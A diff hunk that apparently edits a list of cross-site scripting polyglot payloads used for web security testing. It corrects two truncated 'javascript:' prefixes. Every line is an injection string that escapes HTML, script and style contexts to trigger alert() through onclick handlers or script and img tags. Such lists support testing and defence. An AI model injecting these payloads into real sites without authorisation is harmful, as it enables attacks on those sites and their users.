@@ -21,8 +21,8 @@ alert();-->*/"/'</script>/alert()/onclick=alert()'"</title></textarea></style><p
 */alert()/*\*'\"--></style></script><script>alert()</script><img src=x onclick=alert()><div onclick=alert()>
 alert();//'"--></title></style></textarea></script><a%0d%0A onclick=alert()//>x
 "a"; */ onclick=alert(); /*
-avascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
-avascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
 <button '" onclick=alert(1)//>*/alert()/*
 <button ' onclick=alert(1)//>*/alert(1)//
 <!--/*--><![CDATA[/*>"'</textarea></div></title></script><a onclick=alert()>x<!--*/
